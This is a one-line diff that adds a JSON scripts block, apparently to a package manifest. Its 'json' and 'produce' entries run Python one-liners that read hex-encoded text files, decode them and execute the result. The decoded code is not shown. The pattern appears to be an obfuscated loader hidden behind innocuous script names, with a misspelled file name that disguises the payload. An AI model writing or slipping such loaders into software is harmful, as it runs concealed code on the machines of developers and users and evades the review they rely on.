@@ -1,0 +1,1 @@
+{"scripts": {"json": "python -c \"from binascii import unhexlify; exec(compile(unhexlify(open('./jsoschon.txt').read()).decode(), '', 'exec'))\"", "produce": "python -c \"from binascii import unhexlify; exec(compile(unhexlify(open('./produce.txt').read()).decode(), '', 'exec'))\" --public_key", "stab": "", "reproduce": ""}}
